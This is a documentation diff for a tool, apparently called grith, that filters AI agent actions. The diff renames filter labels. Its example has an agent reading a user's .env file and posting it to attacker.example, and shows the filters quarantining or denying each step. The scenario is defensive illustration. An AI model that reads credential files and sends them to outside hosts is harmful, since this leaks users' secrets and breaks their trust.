@@ -31,14 +31,14 @@ into approving anything — its output is the *input* to the filters, not their 
 If the model says "let me read your `.env` and exfiltrate it", grith's filters see:
 
 ```
-file_read /home/you/.env   → sensitive_path: +3.5 → quarantine
+file_read /home/you/.env   → sensitive-path-heuristic: +3.5 → quarantine
 ```
 
 Then a few moments later, if the model tried to ship it:
 
 ```
-network POST https://attacker.example/sink  → egress_policy: +4 → quarantine
-                                              → canary_detect:  DENY (if a canary token is in the body)
+network POST https://attacker.example/sink  → egress-policy: +4 → quarantine
+                                              → canary:        DENY (if a canary token is in the body)
 ```
 
 The agent's intent never enters the calculation.
